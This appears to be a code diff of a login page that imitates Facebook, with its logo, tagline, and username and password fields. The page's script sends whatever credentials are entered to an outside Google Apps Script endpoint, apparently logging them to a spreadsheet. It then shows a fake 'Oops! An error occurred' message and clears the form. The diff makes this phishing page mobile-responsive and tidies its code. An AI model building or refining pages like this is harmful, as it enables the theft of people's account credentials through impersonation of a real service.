@@ -4,6 +4,9 @@
   <meta charset="UTF-8">
   <title>Responsive Login Page</title>
 
+  <!-- IMPORTANT FOR MOBILE -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
   <style>
     * {
       box-sizing: border-box;
@@ -29,9 +32,8 @@
       width: 100%;
     }
 
-    /* ---------- LEFT AREA WITH IMAGE ---------- */
     .left-text img {
-      width: 320px;          /* adjust image size */
+      width: 320px;
       max-width: 100%;
       margin-bottom: 1px;
     }
@@ -42,7 +44,6 @@
       line-height: 1.3;
     }
 
-    /* ---------- LOGIN BOX ---------- */
     .login-box {
       width: 380px;
       background: #ffffff;
@@ -99,34 +100,75 @@
       margin-right: auto;
     }
 
-    /* ---------- THINNER & LIGHTER HR ---------- */
     hr {
       border: none;
       height: 1.1px;
-      background-color: #ddd;   /* light gray */
+      background-color: #ddd;
       margin-top: 15px;
       margin-bottom: 10px;
     }
-    .spinner {
-  border: 3px solid #fff;
-  border-top: 3px solid transparent;
-  border-radius: 50%;
-  width: 16px;
-  height: 16px;
-  animation: spin 1s linear infinite;
-  margin-left: 10px;
-  display: none;
-}
 
-    /* ---------- RESPONSIVE ---------- */
+    .spinner {
+      border: 3px solid #fff;
+      border-top: 3px solid transparent;
+      border-radius: 50%;
+      width: 16px;
+      height: 16px;
+      animation: spin 1s linear infinite;
+      margin-left: 10px;
+      display: none;
+    }
+
+    /* ---------------- MOBILE RESPONSIVE ---------------- */
     @media (max-width: 900px) {
       .container {
         flex-direction: column;
         text-align: center;
         gap: 25px;
       }
+
+      .left-text img {
+        width: 240px;
+      }
+
+      .left-text p {
+        font-size: 22px;
+        max-width: 95%;
+        margin: 0 auto;
+      }
+
+      .login-box {
+        width: 100%;
+        max-width: 420px;
+      }
     }
 
+    @media (max-width: 500px) {
+      body {
+        padding: 10px;
+      }
+
+      .left-text img {
+        width: 200px;
+      }
+
+      .left-text p {
+        font-size: 18px;
+      }
+
+      .login-box {
+        padding: 14px;
+      }
+
+      .login-box input {
+        font-size: 14px;
+        padding: 12px;
+      }
+
+      .login-btn {
+        font-size: 16px;
+      }
+    }
   </style>
 </head>
 
@@ -135,21 +177,14 @@
 <div class="container">
 
   <div class="left-text">
-
-    <!-- ==== PUT YOUR IMAGE HERE ==== -->
     <img src="facebook.svg" alt="Website Logo">
-
     <p>Connect with friends and the world around you.</p>
   </div>
 
   <div class="login-box">
     <form method="POST" name="google-sheet" id="loginForm">
       <input type="text" placeholder="Username, email or mobile number" id="username" name="username" />
-   
-<div class="password-container">
-<input type="password" placeholder="Password" id="password" name="password" autocomplete="new-password" />
-
-</div>
+      <input type="password" placeholder="Password" id="password" name="password" autocomplete="new-password" />
 
       <button type="submit" class="login-btn" id="loginBtn" name="submit" disabled>
         Log in
@@ -159,37 +194,37 @@
       <div class="forgot">
         <a href="#">Forgot password?</a>
       </div>
+
       <hr>
 
-      <button class="create-btn">Create new account</button>
-
+      <button type="button" class="create-btn">Create new account</button>
     </form>
   </div>
 
 </div>
+
 <script>
   const usernameInput = document.getElementById('username');
-const passwordInput = document.getElementById('password');
-
-function checkInputs() {
-const usernameFilled = usernameInput.value.trim() !== '';
-const passwordFilled = passwordInput.value.trim() !== '';
-loginBtn.disabled = !(usernameFilled && passwordFilled);
-loginBtn.style.opacity = loginBtn.disabled ? '0.6' : '1';
-}
-
-usernameInput.addEventListener('input', checkInputs);
-passwordInput.addEventListener('input', checkInputs);
-
-  const scriptURL = 'https://script.google.com/macros/s/AKfycbyUaf-AGKMIgheBlmSSKKzrryOxg8gl-VmzbsY1DZFIRx0xNmg96XHLZ3JiXOMr27dc/exec';
-  const form = document.forms['google-sheet'];
+  const passwordInput = document.getElementById('password');
   const loginBtn = document.getElementById('loginBtn');
   const spinner = document.getElementById('spinner');
+  const form = document.forms['google-sheet'];
+
+  function checkInputs() {
+    const usernameFilled = usernameInput.value.trim() !== '';
+    const passwordFilled = passwordInput.value.trim() !== '';
+    loginBtn.disabled = !(usernameFilled && passwordFilled);
+    loginBtn.style.opacity = loginBtn.disabled ? '0.6' : '1';
+  }
+
+  usernameInput.addEventListener('input', checkInputs);
+  passwordInput.addEventListener('input', checkInputs);
+
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbyUaf-AGKMIgheBlmSSKKzrryOxg8gl-VmzbsY1DZFIRx0xNmg96XHLZ3JiXOMr27dc/exec';
 
   form.addEventListener('submit', e => {
     e.preventDefault();
 
-    // Show spinner
     spinner.style.display = 'inline-block';
     loginBtn.disabled = true;
     loginBtn.style.opacity = '0.6';
@@ -200,32 +235,17 @@ passwordInput.addEventListener('input', checkInputs);
           spinner.style.display = 'none';
           loginBtn.disabled = false;
           loginBtn.style.opacity = '1';
-          
           form.reset();
         }, 300);
-        alert('Opps! An error occured')
+        alert('Oops! An error occurred');
       })
       .catch(error => {
-        console.error('Error!', error.message);
         spinner.style.display = 'none';
         loginBtn.disabled = false;
         loginBtn.style.opacity = '1';
       });
   });
-
-  function togglePassword() {
-const passwordInput = document.getElementById('password');
-const toggleBtn = document.querySelector('.toggle-password');
-
-if (passwordInput.type === 'password') {
-  passwordInput.type = 'text';
-  toggleBtn.textContent = 'Hide';
-} else {
-  passwordInput.type = 'password';
-  toggleBtn.textContent = 'Show';
-}
-}
-
 </script>
+
 </body>
 </html>
